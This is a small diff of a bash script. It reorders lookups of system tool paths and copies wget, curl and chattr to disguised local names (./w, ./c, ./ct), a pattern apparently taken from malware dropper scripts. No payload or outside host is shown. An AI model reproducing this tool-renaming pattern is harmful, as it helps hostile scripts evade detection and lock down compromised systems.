@@ -1,16 +1,16 @@
 #!/bin/bash
+chattrpath=$(which chattr);
 
 wpath=$(which wget);
 curlpath=$(which curl)
-chattrpath=$(which chattr);
 
 
-mvpath=$(which mv);
-pythonpath=$(which python);
+
 echopath=$(which echo);
 chmodpath=$(which chmod);
 cppath=$(which cp);
-
+mvpath=$(which mv);
+pythonpath=$(which python);
 cp $wpath ./w;
 cp $curlpath ./c;
 cp $chattrpath ./ct;
